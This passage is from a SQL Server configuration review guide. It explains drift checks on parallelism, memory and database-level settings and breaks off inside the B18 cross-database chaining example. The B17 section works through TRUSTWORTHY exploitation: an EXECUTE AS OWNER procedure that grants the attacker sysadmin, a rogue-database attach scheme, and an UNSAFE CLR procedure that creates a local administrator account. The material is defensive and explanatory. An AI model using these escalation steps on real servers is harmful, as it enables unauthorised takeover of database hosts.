# sqldbconfig-review — Check Explanations (B1–B28)

Plain-English explanations for all 28 configuration drift checks. Each entry follows the five-part structure: What it means / How to spot it / Example / Fix options / Related checks.

---

## Contents

- [B1–B5 — Parallelism Configuration](#b1b5--parallelism-configuration)
- [B6–B9 — Memory Configuration](#b6b9--memory-configuration)
- [B10–B18 — Database-Level Settings](#b10b18--database-level-settings)
- [B19–B23 — File and Storage Configuration](#b19b23--file-and-storage-configuration)
- [B24–B28 — Surface Area and Feature Exposure](#b24b28--surface-area-and-feature-exposure)
- [Quick Reference Table](#quick-reference-table)

---

## B1–B5 — Parallelism Configuration

### B1 — MAXDOP = 0 on Multi-NUMA Instance

**What it means**
MAXDOP (Max Degree of Parallelism) controls how many CPU threads a single query can use in parallel. A value of 0 means unlimited — SQL Server may use every available CPU for a single query. On a multi-NUMA server this causes cross-NUMA memory access, which is slower than local-NUMA access, and allows one query to monopolise all CPUs, starving concurrent workloads.

**How to spot it**
```sql
-- sp_configure output showing MAXDOP = 0
SELECT name, value AS config_value, value_in_use AS run_value
FROM sys.configurations
WHERE name = 'max degree of parallelism';
-- config_value = 0 → not configured

-- Check NUMA topology
SELECT cpu_count, scheduler_count, numa_node_count
FROM sys.dm_os_sys_info;
-- numa_node_count > 1 → multi-NUMA, B1 fires
```

**Example (problem → fix)**
```sql
-- Problem: 4-NUMA server, 64 schedulers, MAXDOP = 0
-- A single MERGE query consumes all 64 threads across 4 NUMA nodes

-- SQL 2016+ rule: 4-NUMA, 64 schedulers → 16 per NUMA node → ≤ 16, so MAXDOP ≤ 16
-- Microsoft guidance for ≤ 16 per node: MAXDOP ≤ logical-per-node (8 is a common starting point)
EXEC sp_configure 'max degree of parallelism', 8;
RECONFIGURE;

-- Example: 2-NUMA, 64 schedulers → 32 per NUMA node → > 16, so MAXDOP = half(32) = 16
EXEC sp_configure 'max degree of parallelism', 16;
RECONFIGURE;
```

**Fix options**
1. SQL 2016+: `logical_per_node = scheduler_count / numa_node_count`. If ≤ 16: MAXDOP ≤ logical_per_node. If > 16: MAXDOP = half(logical_per_node), max 16
2. SQL 2014 and earlier: MAXDOP ≤ logical_per_node, cap at 8
3. For OLTP-heavy servers with short queries, consider MAXDOP 4 or lower regardless of the formula
4. Use Resource Governor to apply different MAXDOP per workload group for mixed environments

**Related checks:** B3 (MAXDOP too high), B2 (CTP too low causing excessive parallelism)

---

### B2 — Cost Threshold for Parallelism at Default

**What it means**
The Cost Threshold for Parallelism (CTP) is the estimated cost (in abstract units) at which SQL Server considers using a parallel plan. The default of 5 was set in the 1990s for hardware of that era; MS Learn calls 5 "a starting point, not a recommendation" and does **not** publish a specific target value. On modern multi-core servers it is often too low — queries costing 6, 10, or 20 units can trigger parallel plans unnecessarily, consuming threads and causing CXPACKET waits. The 25–50 / 45–75 ranges used by this check are **community/operational heuristics, not MS-documented values**; raise CTP in small steps and confirm direction from waits (`CXPACKET`/`CXCONSUMER` = too low; `SOS_SCHEDULER_YIELD` with under-parallelized heavy queries = too high).

**How to spot it**
```sql
SELECT name, value AS config_value
FROM sys.configurations
WHERE name = 'cost threshold for parallelism';
-- config_value = 5 → default unchanged, B2 fires
```

**Example (problem → fix)**
```sql
-- Problem: A reporting query with cost = 12 uses 8 parallel threads
-- on a busy OLTP server, starving short transactions

-- Fix: raise CTP to reduce trivial parallelism
EXEC sp_configure 'cost threshold for parallelism', 50;
RECONFIGURE;
-- Queries costing < 50 now run serially; only heavier queries go parallel
```

**Fix options**
1. Start at 50 for OLTP servers and tune down if heavy reports suffer
2. For mixed OLTP/reporting: 25–45
3. For pure reporting/DW: 25 or lower is acceptable — parallelism is beneficial there
4. Monitor CXPACKET/CXCONSUMER wait reduction after change

**Related checks:** B1 (MAXDOP = 0 amplifies CTP effects), B3 (MAXDOP too high)

---

### B3 — MAXDOP Exceeds Per-NUMA CPU Count

**What it means**
When MAXDOP is set higher than the number of schedulers per NUMA node, parallel query threads must be scheduled across NUMA nodes. This forces cross-NUMA memory access — threads on one NUMA node read memory allocated on another, which is significantly slower than local-NUMA access (typically 2–3× latency penalty).

**How to spot it**
```sql
SELECT
    scheduler_count,
    numa_node_count,
    scheduler_count / numa_node_count AS schedulers_per_numa
FROM sys.dm_os_sys_info;

SELECT value AS maxdop_config
FROM sys.configurations
WHERE name = 'max degree of parallelism';
-- B3 fires if maxdop_config > schedulers_per_numa
```

**Example (problem → fix)**
```sql
-- 2-NUMA server, 32 schedulers total → 16 per NUMA node
-- MAXDOP = 20 → forces cross-NUMA allocation on parallel queries

-- SQL 2016+ rule: 16 per NUMA ≤ 16, so MAXDOP ≤ 16. MAXDOP 20 exceeds it → reduce
EXEC sp_configure 'max degree of parallelism', 16;
RECONFIGURE;

-- If this were > 16 per NUMA (e.g. 2-NUMA, 80 schedulers = 40 per node):
-- MAXDOP = half(40) = 20, max 16 → MAXDOP = 16
```

**Fix options**
1. SQL 2016+: if logical-per-NUMA ≤ 16 → MAXDOP ≤ logical-per-NUMA; if > 16 → MAXDOP = half(logical-per-NUMA), max 16
2. SQL 2014 and earlier: MAXDOP ≤ logical-per-NUMA, cap at 8
3. Verify the change reduces NUMA-remote memory in `sys.dm_os_memory_nodes`

**Related checks:** B1 (MAXDOP = 0), B2 (CTP too low)

---

### B4 — Optimize for Ad Hoc Workloads Disabled

**What it means**
When this setting is off, the first execution of any ad hoc query stores the full compiled plan in the plan cache. On servers with many distinct ad hoc queries (ORMs, reporting tools, dynamic SQL), this bloats the plan cache with single-use plans that consume buffer pool memory and are never reused. When enabled, only a small "stub" is cached on first execution; the full plan is cached only if the query runs again.

**How to spot it**
```sql
SELECT name, value AS config_value
FROM sys.configurations
WHERE name = 'optimize for ad hoc workloads';
-- config_value = 0 → disabled, B4 fires

-- Check current single-use plan waste
SELECT
    SUM(CASE WHEN usecounts = 1 THEN size_in_bytes ELSE 0 END) / 1048576 AS single_use_mb,
    SUM(size_in_bytes) / 1048576 AS total_plan_cache_mb
FROM sys.dm_exec_cached_plans
WHERE objtype IN ('Adhoc', 'Prepared');
-- If single_use_mb is large relative to total, enable this setting
```

**Example (problem → fix)**
```sql
-- Problem: plan cache is 8 GB; 6 GB is single-use adhoc plans
-- Buffer pool is being crowded out

-- Fix: enable (dynamic, no restart required)
EXEC sp_configure 'optimize for ad hoc workloads', 1;
RECONFIGURE;
-- Existing single-use plans remain; new ones get stubs only
-- Run DBCC FREEPROCACHE to reclaim space from existing single-use plans if needed
```

**Fix options**
1. Enable — this is safe and recommended on virtually all production servers
2. After enabling, optionally run `DBCC FREEPROCACHE` to immediately reclaim cache
3. Combine with `sqlmemory-review` O6 check for broader plan cache analysis

**Related checks:** B6 (Max Server Memory — plan cache bloat worsens when memory is unconstrained)

---

### B5 — Query Governor Not Configured

**What it means**
The Query Governor Cost Limit caps the maximum estimated cost of any query allowed to run. Queries exceeding the limit fail immediately rather than running for minutes or hours. When set to 0 (default), no cap is enforced — runaway queries can monopolise the server.

**How to spot it**
```sql
SELECT name, value AS config_value
FROM sys.configurations
WHERE name = 'query governor cost limit';
-- config_value = 0 → no limit enforced, B5 fires as Info
```

**Example (problem → fix)**
```sql
-- Problem: a nightly report accidentally runs interactively and
-- consumes 100% CPU for 45 minutes before it is killed manually

-- Fix: set a cost limit appropriate for the environment
EXEC sp_configure 'query governor cost limit', 3600;
RECONFIGURE;
-- Queries with estimated cost > 3600 will fail with error 8649
-- The cost unit is abstract (not seconds), so calibrate against known long queries
```

**Fix options**
1. Only apply this setting if runaway queries are a documented or recurring problem
2. Consider session-level `SET QUERY_GOVERNOR_COST_LIMIT` for specific applications instead of server-wide
3. Resource Governor provides more granular control per workload group

**Related checks:** B2 (CTP — controls which queries go parallel rather than capping cost)

---

## B6–B9 — Memory Configuration

### B6 — Max Server Memory Not Configured

**What it means**
When Max Server Memory is left at the default (configured value = 0, which resolves to 2,147,483,647 MB at runtime), SQL Server can claim as much RAM as the OS allows. On a server with 128 GB of RAM, SQL Server may eventually hold 120+ GB, leaving insufficient memory for the OS, other services, and Windows kernel operations. This causes OS paging (disk-based virtual memory access), which is catastrophically slow.

**How to spot it**
```sql
SELECT name, value AS config_value, value_in_use AS run_value
FROM sys.configurations
WHERE name = 'max server memory (MB)';
-- config_value = 0 → not explicitly set, B6 fires as Critical
-- (value_in_use will show 2147483647 — the effective unlimited ceiling)
```

**Example (problem → fix)**
```sql
-- Server has 64 GB RAM; leave 4–8 GB for OS
EXEC sp_configure 'max server memory (MB)', 57344;  -- 56 GB
RECONFIGURE;

-- For 128 GB server: leave ~10–15 GB for OS
EXEC sp_configure 'max server memory (MB)', 116736;  -- 114 GB
RECONFIGURE;
```

**Fix options**
1. Rule of thumb: reserve MAX(4 GB, 10% of total RAM) for OS; give the rest to SQL Server
2. On servers running other services (IIS, SSAS), reserve more — assess actual OS working set
3. Monitor `sys.dm_os_sys_memory.available_physical_memory_kb` after change — target > 1 GB available

**Related checks:** B7 (Min Server Memory), B8 (LPIM), O20 in `sqlmemory-review`

---

### B7 — Min Server Memory Greater Than Zero

**What it means**
Min Server Memory sets a floor below which SQL Server will not release buffer pool memory even when the OS requests it. During low-load periods (e.g., overnight batch completion), SQL Server should release memory to other processes. A non-zero floor prevents this, potentially causing memory pressure on the OS during off-peak periods or after a large job completes.

**How to spot it**
```sql
SELECT name, value AS config_value
FROM sys.configurations
WHERE name = 'min server memory (MB)';
-- config_value > 0 → B7 fires
```

**Example (problem → fix)**
```sql
-- Problem: Min Server Memory set to 32768 MB on a server that
-- also hosts a nightly ETL process in SSIS
-- After SQL Server batch completes, it refuses to release 32 GB
-- SSIS process pages to disk

-- Fix:
EXEC sp_configure 'min server memory (MB)', 0;
RECONFIGURE;
```

**Fix options**
1. Set to 0 in almost all cases — SQL Server manages its own working set
2. The only valid reason for a non-zero Min is to guarantee SQL Server warms its cache quickly on shared hosts
3. If set intentionally, document the reason in a server change log

**Related checks:** B6 (Max Server Memory), B8 (LPIM)

---

### B8 — Lock Pages in Memory Active

**What it means**
Lock Pages in Memory (LPIM) grants SQL Server the `SE_LOCK_MEMORY` Windows privilege, which instructs the OS not to page out the SQL Server buffer pool to disk. This prevents SQL Server from being a "good citizen" on shared machines but protects the buffer pool on dedicated servers. The risk is that if Max Server Memory is not set correctly (B6), LPIM prevents the OS from reclaiming memory under pressure, potentially causing system-wide instability.

**How to spot it**
```sql
SELECT sql_memory_model_desc
FROM sys.dm_os_sys_info;
-- 'LOCK_PAGES' → LPIM is active, B8 fires as Info
-- (requires SQL Server 2012 SP4 or SQL Server 2016 SP1+)
```

**Example (investigation)**
```sql
-- Verify LPIM is intentional
SELECT sql_memory_model_desc FROM sys.dm_os_sys_info;
-- AND verify Max Server Memory is correctly set (B6 clean)
SELECT value AS max_mem_mb FROM sys.configurations
WHERE name = 'max server memory (MB)';
-- If max_mem_mb = 0 and LPIM is active → Critical combination, raise both B6 and B8
```

**Fix options**
1. If LPIM is intentional on a dedicated SQL Server: ensure B6 is clean (Max Server Memory set) — then B8 is acceptable
2. If LPIM is unintentional: remove `SE_LOCK_MEMORY` from the SQL Server service account via Local Security Policy and restart SQL Server
3. LPIM is recommended by Microsoft for SQL Server on physical hosts with > 32 GB RAM

**Related checks:** B6 (Max Server Memory — must be set when LPIM is active)

---

### B9 — AWE Enabled on 64-Bit Instance

**What it means**
This check targets the `awe enabled` **sp_configure option** — a SQL Server 2005/2008-era, 32-bit-only switch that let a 32-bit process address more than 4 GB of physical RAM via Address Windowing Extensions (AWE) memory windows. On 64-bit SQL Server the *option* has no effect and is ignored by the engine, and it was removed entirely in SQL Server 2012. So `config_value = 1` indicates a SQL Server 2008 R2 or earlier instance (the bigger issue is running out-of-support). Don't confuse this option with the AWE **API**: 64-bit SQL Server still uses the AWE API as the "locked pages" mechanism when Lock Pages in Memory is granted — so AWE allocations do happen on 64-bit; it's only the config switch that is obsolete.

**How to spot it**
```sql
SELECT name, value AS config_value
FROM sys.configurations
WHERE name = 'awe enabled';
-- config_value = 1 on a 64-bit SQL Server instance → B9 fires
```

**Example (problem → fix)**
```sql
-- Problem: sys.dm_os_sys_info shows 64-bit SQL Server
-- but awe enabled = 1 from a legacy 32-bit migration

-- Fix (dynamic, no restart required):
EXEC sp_configure 'awe enabled', 0;
RECONFIGURE;
```

**Fix options**
1. Disable — safe, no restart required, no functional impact on 64-bit SQL Server
2. Document the change in the server change log

**Related checks:** B6 (Max Server Memory — the actual memory limit mechanism on 64-bit)

---

## B10–B18 — Database-Level Settings

### B10 — Auto-Shrink Enabled

**What it means**
Auto-shrink is a database option that instructs SQL Server to periodically check whether 25% or more of the database is free space, and if so, shrink the file back down. The result is a continuous shrink-grow cycle: shrink removes free space, the next data load forces an auto-grow, which IFI must initialise (or zero), which causes a blocking event, which adds fragmentation — then the cycle repeats.

**How to spot it**
```sql
SELECT name, is_auto_shrink_on
FROM sys.databases
WHERE is_auto_shrink_on = 1;
-- Any row returned → B10 fires as Critical
```

**Example (problem → fix)**
```sql
-- Problem: SalesDB shrinks nightly, then auto-grows at 9 AM
-- causing 30-second blocking at business open

-- Fix:
ALTER DATABASE [SalesDB] SET AUTO_SHRINK OFF;

-- If disk space is genuinely low, shrink manually (one-time only):
USE SalesDB;
DBCC SHRINKFILE (SalesDB_Data, 10240);  -- shrink to 10 GB
-- Then immediately re-evaluate data growth plan
```

**Fix options**
1. Disable auto-shrink on all databases immediately — no exceptions
2. If disk space is critically low: shrink manually, then provision more disk
3. Monitor `sys.dm_io_virtual_file_stats` for IO latency spikes after disabling

**Related checks:** B21 (percent auto-growth), Z7–Z9 in `sqldiskio-review`

---

### B11 — Auto-Close Enabled

**What it means**
Auto-close shuts down a database and releases all resources when the last connection closes. When a new connection arrives, SQL Server must re-open the database, re-read header pages, re-warm caches, and re-establish the buffer pool — adding significant latency to the first query. On busy servers, databases can open and close dozens of times per minute.

**How to spot it**
```sql
SELECT name, is_auto_close_on
FROM sys.databases
WHERE is_auto_close_on = 1;
-- Any row returned → B11 fires as Critical
```

**Example (problem → fix)**
```sql
-- Problem: a .NET application uses a connection pool but the pool
-- periodically drains, triggering auto-close on the database
-- First query from each new pool burst takes 2–5 seconds

-- Fix:
ALTER DATABASE [AppDB] SET AUTO_CLOSE OFF;
```

**Fix options**
1. Disable auto-close on all databases — there is no production scenario where it is beneficial
2. Auto-close is enabled by default in SQL Server Express — check all Express instances

**Related checks:** B10 (auto-shrink — similar pattern of repeated initialisation overhead)

---

### B12 — Compatibility Level Below SQL Server Version

**What it means**
The database compatibility level controls which SQL Server version's Query Optimizer behaviours and T-SQL feature set apply to that database. Running a SQL 2019 instance with a database at compatibility level 100 (SQL 2008) means that database misses 15 years of cardinality estimator improvements, Intelligent Query Processing (IQP) features, and modern T-SQL syntax. Common after upgrades that preserved the old compatibility level.

**How to spot it**
```sql
SELECT name, compatibility_level,
       SERVERPROPERTY('ProductMajorVersion') AS sql_major_version
FROM sys.databases
WHERE compatibility_level < (CAST(SERVERPROPERTY('ProductMajorVersion') AS int) * 10)
  AND database_id > 4;
-- Valid levels: 80, 90, 100, 110, 120, 130, 140, 150, 160, 170 [Unverified — 170 pending future SQL Server release; SQL 2022 currently has level 160 as highest]
```

**Example (problem → fix)**
```sql
-- SQL Server 2022 (version 16) → recommended level 160
-- Database still at 130 (SQL 2016)

ALTER DATABASE [OldDB] SET COMPATIBILITY_LEVEL = 160;
-- Test query workload before and after — use Query Store to compare plans
```

**Fix options**
1. Upgrade one database at a time, test with Query Store regression detection (`sqlquerystore-review`)
2. If plan regressions appear, use Query Store plan forcing while fixing root cause
3. Check for deprecated features at the old level before upgrading (`sys.dm_exec_query_stats`, error log)

**Related checks:** B13 (RCSI — some RCSI behaviours are level-dependent), Q1–Q5 in `sqlquerystore-review`

---

### B13 — RCSI Not Enabled

**What it means**
Read Committed Snapshot Isolation (RCSI) changes the behaviour of the READ COMMITTED isolation level (the default). Without RCSI, readers acquire shared locks and block on writers; writers block readers. With RCSI, readers see a committed snapshot of data from tempdb's version store and never block writers. This eliminates the most common form of reader-writer blocking in OLTP databases.

**How to spot it**
```sql
SELECT name, is_read_committed_snapshot_on,
       snapshot_isolation_state_desc
FROM sys.databases
WHERE is_read_committed_snapshot_on = 0
  AND database_id > 4          -- skip system databases
  AND state_desc = 'ONLINE';
```

**Example (problem → fix)**
```sql
-- Problem: reporting queries on SalesDB block INSERT/UPDATE operations
-- causing 500-ms waits during business hours

-- Fix: enable RCSI (requires brief exclusive database access)
-- Run during low-traffic window:
ALTER DATABASE [SalesDB] SET READ_COMMITTED_SNAPSHOT ON;
-- No application changes required — READ COMMITTED behaviour silently improves
```

**Fix options**
1. Enable RCSI on all user databases with concurrent read/write workloads
2. Monitor tempdb version store growth after enabling (`sys.dm_db_log_space_usage`, `sys.dm_tran_version_store_space_usage`)
3. For databases with long-running transactions, version store can grow large — size tempdb accordingly

**Related checks:** B23 (TempDB file count — version store lives in tempdb), V17–V20 in `sqlwait-review`

---

### B14 — Page Verification Not CHECKSUM

**What it means**
SQL Server can write a checksum into each 8 KB data page when it writes it to disk. When the page is later read back, the checksum is re-calculated and compared. Any mismatch indicates storage-layer corruption (bad sectors, HBA issues, storage firmware bugs). Without CHECKSUM, SQL Server may silently read corrupted pages and return wrong query results or crash with obscure errors.

**How to spot it**
```sql
SELECT name, page_verify_option_desc
FROM sys.databases
WHERE page_verify_option_desc <> 'CHECKSUM'
  AND database_id > 4;
-- NONE or TORN_PAGE_DETECTION → B14 fires
```

**Example (problem → fix)**
```sql
-- Problem: legacy database uses TORN_PAGE_DETECTION — weaker protection
ALTER DATABASE [LegacyDB] SET PAGE_VERIFY CHECKSUM;
-- Change applies to newly written pages; existing pages are checked on read
-- No impact to live operations
```

**Fix options**
1. Enable CHECKSUM on all databases immediately — no performance downside on modern hardware
2. After enabling, run `DBCC CHECKDB` to validate existing pages
3. Monitor SQL Server error log for checksum failure messages (Msg 824) after enabling

**Related checks:** B10 (auto-shrink — forced page rewrites after shrink are the first opportunity to pick up CHECKSUM)

---

### B15 — Auto-Create Statistics Disabled

**What it means**
When auto-create statistics is enabled, SQL Server automatically creates single-column statistics on columns that appear in WHERE, JOIN, GROUP BY, or ORDER BY clauses if no statistics exist. Without these statistics, the Query Optimizer uses default cardinality estimates (often far off) and produces bad plans. Disabling this is almost never correct.

**How to spot it**
```sql
SELECT name, is_auto_create_stats_on
FROM sys.databases
WHERE is_auto_create_stats_on = 0
  AND database_id > 4;
```

**Example (problem → fix)**
```sql
-- Problem: a new column is added to a large table and queries
-- filtering on it get a bad plan because no stats exist

-- Fix: re-enable auto-create
ALTER DATABASE [AppDB] SET AUTO_CREATE_STATISTICS ON;
-- Then create stats manually on the new column if needed immediately:
CREATE STATISTICS [stat_new_column] ON [dbo].[Orders] ([ShipDate]);
```

**Fix options**
1. Re-enable immediately — safe, low-overhead
2. If disabled to control statistics creation on a very large table, use a manual stats job instead and re-enable auto-create with `(INCREMENTAL = ON)` for partitioned tables

**Related checks:** B16 (auto-update statistics), N21 in `sqlplan-review` (cardinality estimate errors)

---

### B16 — Auto-Update Statistics Disabled

**What it means**
Auto-update statistics triggers a statistics refresh when the number of row modifications crosses a threshold (approximately 20% of rows for tables < 500 rows; sqrt(1000 × row_count) for larger tables in newer compat levels). Without auto-update, statistics grow stale and cardinality estimates drift away from reality, producing increasingly bad query plans over time.

**How to spot it**
```sql
SELECT name, is_auto_update_stats_on
FROM sys.databases
WHERE is_auto_update_stats_on = 0
  AND database_id > 4;
```

**Example (problem → fix)**
```sql
-- Problem: a nightly bulk load inserts 10M rows into a 50M row table
-- By morning, statistics are stale and slow plans appear

-- Fix:
ALTER DATABASE [DataWarehouse] SET AUTO_UPDATE_STATISTICS ON;
-- For large tables where auto-update thresholds trigger too infrequently,
-- also enable trace flag 2371 (SQL 2014-) or use compat level 130+ which
-- uses a dynamic threshold
```

**Fix options**
1. Re-enable immediately
2. Enable `AUTO_UPDATE_STATISTICS_ASYNC ON` for OLTP databases to avoid blocking queries during stats update
3. Supplement with a manual stats maintenance job for very large tables

**Related checks:** B15 (auto-create statistics), N21 in `sqlplan-review`

---

### B17 — Trustworthy Enabled on User Database

**What it means**

The `TRUSTWORTHY` property tells SQL Server to trust the contents of a database and allow modules inside it — stored procedures, functions, CLR assemblies — to step outside the database boundary and act with server-level authority, **provided the database owner is a member of `sysadmin`**.

Normally, even an `EXECUTE AS OWNER` stored procedure is sandboxed to the current database. MS Learn confirms: "any attempt to access resources outside of the database will cause the statement to fail." TRUSTWORTHY lifts that sandbox. When it is ON and the owner is `sa` or another sysadmin member, database-level `db_owner` becomes a path to full server compromise.

By default, TRUSTWORTHY is OFF on all user databases and is reset to OFF whenever a database is attached or restored.

**Owner considerations — three things that look alike but are not**

MS Learn explicitly states: *"the `dbo` user account isn't the same as the `db_owner` fixed database role, and the `db_owner` fixed database role isn't the same as the user account that is recorded as the owner of the database."*

| Concept | What it is | Where stored |
|---------|-----------|-------------|
| **Database owner login** | The server login whose SID is recorded as the database owner. Stored procedures using `EXECUTE AS OWNER` impersonate this login. | `sys.databases.owner_sid` |
| **`dbo` user** | A special database principal that all `sysadmin` members, the `sa` login, and the database owner enter the database as. Always maps to the database owner login. | `sys.database_principals WHERE name = 'dbo'` |
| **`db_owner` role** | A fixed database role whose members have full control inside the database — but are NOT automatically the database owner unless the database was created by that login. | `sys.database_role_members` |

**Why `db_owner` membership is the attack precondition for B17:**

When a `db_owner` role member creates a stored procedure, the proc is created in `dbo` schema and effectively owned by `dbo`. Using `WITH EXECUTE AS OWNER` in that proc impersonates the **database owner login** (the one in `sys.databases.owner_sid`) — not just the `dbo` user. If that login is `sa` or a sysadmin member, and TRUSTWORTHY is ON, the impersonation carries full server-level authority.

```sql
-- Identify who the real database owner login is (sys.databases.owner_sid)
SELECT d.name              AS database_name,
       SUSER_SNAME(d.owner_sid) AS database_owner_login,  -- this is what EXECUTE AS OWNER resolves to
       dp.name             AS dbo_user,                    -- always 'dbo' inside the DB
       IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(d.owner_sid)) AS owner_is_sysadmin
FROM sys.databases d
LEFT JOIN sys.database_principals dp
    ON d.database_id = DB_ID(d.name) AND dp.name = 'dbo'
WHERE d.is_trustworthy_on = 1
  AND d.database_id <> 4;
-- owner_is_sysadmin = 1 → EXECUTE AS OWNER gives sysadmin authority when TRUSTWORTHY is ON
```

**How to spot it**

```sql
-- Highest-risk combination: TRUSTWORTHY ON + dbo is a sysadmin member
SELECT d.name                          AS database_name,
       SUSER_SNAME(d.owner_sid)        AS dbo_login,
       d.is_trustworthy_on
FROM sys.databases d
WHERE d.is_trustworthy_on = 1
  AND d.database_id <> 4              -- msdb is expected ON
  AND IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(d.owner_sid)) = 1;

-- All TRUSTWORTHY databases (even with non-sysadmin owner, still flag)
SELECT name, is_trustworthy_on, SUSER_SNAME(owner_sid) AS dbo_login
FROM sys.databases
WHERE is_trustworthy_on = 1
  AND database_id <> 4;
```

**Exploitation — Path 1: EXECUTE AS OWNER → sysadmin escalation**

This is the most common attack. The attacker holds `db_owner` in a TRUSTWORTHY database whose dbo is a `sysadmin` member (e.g. `sa`).

```sql
-- Precondition: AttackerLogin is db_owner in AppDB
-- AppDB: TRUSTWORTHY ON, owned by sa

USE AppDB;
GO

-- Attacker creates a proc that runs as the database OWNER (= sa)
CREATE PROCEDURE usp_EscalatePrivilege
WITH EXECUTE AS OWNER   -- OWNER resolves to sa — a sysadmin member
                        -- TRUSTWORTHY allows this to carry server-level permissions
AS
BEGIN
    -- Running as sa — full server authority now available
    EXEC master..sp_addsrvrolemember 'AttackerLogin', 'sysadmin';
END;
GO

EXEC usp_EscalatePrivilege;
-- AttackerLogin is now sysadmin

-- Verify:
SELECT IS_SRVROLEMEMBER('sysadmin');  -- returns 1
```

MS Learn Policy-Based Management states directly: "There are ways to elevate a user with the `db_owner` role to become a `sysadmin` when setting `TRUSTWORTHY` to ON."

**Exploitation — Path 2: Rogue database attach**

TRUSTWORTHY is reset to OFF on attach — but an attacker with access to a `.mdf` file can prepare a malicious database and wait for an admin to re-enable TRUSTWORTHY for it.

```sql
-- Attacker steps (offline):
-- 1. Obtain a copy of a database .mdf (from backup, stolen media, shared storage)
-- 2. Attach it to a test instance
-- 3. Add the malicious proc (usp_EscalatePrivilege above) to the database
-- 4. Detach and deliver to target — TRUSTWORTHY is OFF after attach
-- 5. Social-engineer admin into running: ALTER DATABASE [AppDB] SET TRUSTWORTHY ON
-- 6. Attacker executes the proc → sysadmin

-- Admin detection: always audit database contents before enabling TRUSTWORTHY post-attach
SELECT o.name, o.type_desc, m.definition
FROM sys.sql_modules m
JOIN sys.objects o ON m.object_id = o.object_id
WHERE m.definition LIKE '%EXECUTE AS%'
   OR m.definition LIKE '%sp_addsrvrolemember%'
   OR m.definition LIKE '%xp_cmdshell%';
```

MS Learn warns: "if the database is taken offline, if you have access to the database file you can potentially attach it to an instance of SQL Server of your choice and add malicious content to the database."

**Exploitation — Path 3: UNSAFE CLR assembly (SQL 2016 and earlier)**

When TRUSTWORTHY is ON and `clr strict security` is OFF (the default before SQL 2017), a `db_owner` whose database is owned by a sysadmin can load an UNSAFE CLR assembly — .NET code with no restrictions that can call OS functions, read files, and execute arbitrary commands.

```sql
-- SQL 2016 / clr strict security = 0:
-- UNSAFE assemblies can call unmanaged code — arbitrary OS commands, file I/O, etc.
CREATE ASSEMBLY MaliciousShell
FROM 0x4D5A90...           -- compiled .NET DLL with [SqlProcedure] calling Process.Start
WITH PERMISSION_SET = UNSAFE;
-- UNSAFE requires: sysadmin, OR TRUSTWORTHY ON with sysadmin-owned dbo

CREATE PROCEDURE usp_RunOsCommand (@cmd NVARCHAR(256))
AS EXTERNAL NAME MaliciousShell.[MaliciousShell.ShellHelper].RunCommand;

EXEC usp_RunOsCommand N'net user hacker P@ssword /add';
EXEC usp_RunOsCommand N'net localgroup administrators hacker /add';
```

**SQL 2017+ mitigation:** `clr strict security = 1` (default ON) treats ALL assemblies as UNSAFE regardless of PERMISSION_SET — they must be signed and trusted via `sys.sp_add_trusted_assembly`. This closes Path 3 even when TRUSTWORTHY is ON. Verify:

```sql
SELECT name, value_in_use
FROM sys.configurations
WHERE name = 'clr strict security';
-- value_in_use = 1 → Path 3 is mitigated
```

**Fix options**
1. `ALTER DATABASE [x] SET TRUSTWORTHY OFF` — this is safe for the vast majority of applications
2. If Service Broker cross-database messaging requires it: change the database owner from `sa` to a non-sysadmin dedicated service account — TRUSTWORTHY can remain ON without escalation risk
3. If CLR assemblies need EXTERNAL_ACCESS: use certificate-based signing (`CREATE CERTIFICATE` in both databases) — eliminates the TRUSTWORTHY dependency entirely
4. Enable `clr strict security = 1` (SQL 2017+ default) as a defence-in-depth measure against Path 3

**Related checks:** B18 (cross-DB chaining — the other permission-bypass mechanism), B24 (CLR enabled), B27 (instance-level chaining)

---

### B18 — Cross-Database Ownership Chaining at Database Level

**What it means**

SQL Server's **ownership chain** rule: when object A (a stored proc) calls object B (a table) and both are owned by the same principal, SQL Server skips the permission check on B. The caller only needs `EXECUTE` on A — they never need `SELECT` on B. This is the normal, safe, within-database behaviour.

**Cross-database ownership chaining** extends this rule across database boundaries. When `DB_CHAINING` is ON in both the calling database and the target database, and both are owned by the same login, the permission check on the target database's objects is also skipped.

This means: a user with `EXECUTE` on a stored proc in DB1 can read (or modify) data in DB2 without any explicit `SELECT` on DB2 objects, without being a user in DB2, and without the DBA being aware they have that access.

**Owner considerations — what "same owner" actually means**

The chain fires when **the same server login owns both the calling object and the target object**. This is determined by `sys.databases.owner_sid` — not by `db_owner` role membership.

| Concept | Role in chaining |
|---------|-----------------|
| **Database owner login** (`sys.databases.owner_sid`) | The login that must match on both ends. Identified via `SUSER_SNAME(owner_sid)`. |
| **`dbo` user** | Inside the database, the `dbo` user IS the database owner login. Objects created in the `dbo` schema are owned by this login. |
| **`db_owner` role** | Members can CREATE objects (which land in `dbo` schema and become owned by `dbo`), but `db_owner` membership alone does NOT make the chain fire. The owner_sid match is what matters. |

**The `db_owner` role's indirect part:** A `db_owner` member can create a stored procedure that references cross-database objects. That proc is created in the `dbo` schema, making the database owner login its effective owner. If the two databases share the same `owner_sid`, the chain fires for anyone who executes that proc — even users with zero rights in the target database.

```sql
-- Find database pairs that share the same owner_sid (chain candidates)
SELECT a.name       AS calling_db,
       b.name       AS target_db,
       SUSER_SNAME(a.owner_sid) AS shared_owner_login,
       a.is_db_chaining_on      AS calling_chaining_on,
       b.is_db_chaining_on      AS target_chaining_on
FROM sys.databases a
JOIN sys.databases b
    ON a.owner_sid = b.owner_sid   -- same login owns both
   AND a.database_id <> b.database_id
WHERE a.is_db_chaining_on = 1
  AND b.is_db_chaining_on = 1
  AND a.database_id > 4
ORDER BY shared_owner_login, calling_db;
-- Any row = a live cross-DB chain path
```

**How to spot it**

```sql
-- Databases with per-database chaining enabled
SELECT name, is_db_chaining_on,
       SUSER_SNAME(owner_sid) AS dbo_login
FROM sys.databases
WHERE is_db_chaining_on = 1
  AND database_id > 4;    -- skip system databases

-- Instance-level chaining (overrides per-database setting for ALL databases)
SELECT name, value_in_use AS chaining_enabled
FROM sys.configurations
WHERE name = 'cross db ownership chaining';
-- value_in_use = 1 → all databases participate regardless of DB_CHAINING setting
```

**Exploitation — bypassing database-level permission isolation**

```sql
-- Setup:
-- SalesDB  (owned by sa, DB_CHAINING ON) contains usp_GetAllOrders
-- PayrollDB (owned by sa, DB_CHAINING ON) contains dbo.Salaries (sensitive table)
-- AttackerUser has db_datareader on SalesDB, zero permissions on PayrollDB

-- DBA creates a cross-database proc in SalesDB (legitimate historical code):
USE SalesDB;
GO
CREATE PROCEDURE usp_GetAllOrders
AS
